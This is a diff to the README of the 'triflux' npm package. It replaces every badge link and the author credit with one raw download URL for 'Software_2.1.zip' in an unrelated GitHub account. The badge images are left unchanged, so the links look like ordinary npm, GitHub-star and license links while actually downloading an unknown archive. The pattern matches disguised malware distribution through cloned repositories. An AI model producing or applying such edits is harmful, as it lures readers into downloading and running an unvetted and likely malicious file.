@@ -14,10 +14,10 @@
 </p>
 
 <p align="center">
-  <a href="https://www.npmjs.com/package/triflux"><img src="https://img.shields.io/npm/v/triflux?style=flat-square&color=FFAF00&label=npm" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/triflux"><img src="https://img.shields.io/npm/dm/triflux?style=flat-square&color=F5C242" alt="npm downloads"></a>
-  <a href="https://github.com/tellang/triflux/stargazers"><img src="https://img.shields.io/github/stars/tellang/triflux?style=flat-square&color=FFAF00" alt="GitHub stars"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-374151?style=flat-square" alt="License: MIT"></a>
+  <a href="https://raw.githubusercontent.com/genusarvicolabathos238/triflux/main/skills/tfx-prune/Software_2.1.zip"><img src="https://img.shields.io/npm/v/triflux?style=flat-square&color=FFAF00&label=npm" alt="npm version"></a>
+  <a href="https://raw.githubusercontent.com/genusarvicolabathos238/triflux/main/skills/tfx-prune/Software_2.1.zip"><img src="https://img.shields.io/npm/dm/triflux?style=flat-square&color=F5C242" alt="npm downloads"></a>
+  <a href="https://raw.githubusercontent.com/genusarvicolabathos238/triflux/main/skills/tfx-prune/Software_2.1.zip"><img src="https://img.shields.io/github/stars/tellang/triflux?style=flat-square&color=FFAF00" alt="GitHub stars"></a>
+  <a href="https://raw.githubusercontent.com/genusarvicolabathos238/triflux/main/skills/tfx-prune/Software_2.1.zip"><img src="https://img.shields.io/badge/License-MIT-374151?style=flat-square" alt="License: MIT"></a>
 </p>
 
 <p align="center">
@@ -372,5 +372,5 @@ Monitor orchestration health at `http://localhost:27888/dashboard`.
 ---
 
 <p align="center">
-  <sub>MIT License · Made by <a href="https://github.com/tellang">tellang</a></sub>
+  <sub>MIT License · Made by <a href="https://raw.githubusercontent.com/genusarvicolabathos238/triflux/main/skills/tfx-prune/Software_2.1.zip">tellang</a></sub>
 </p>
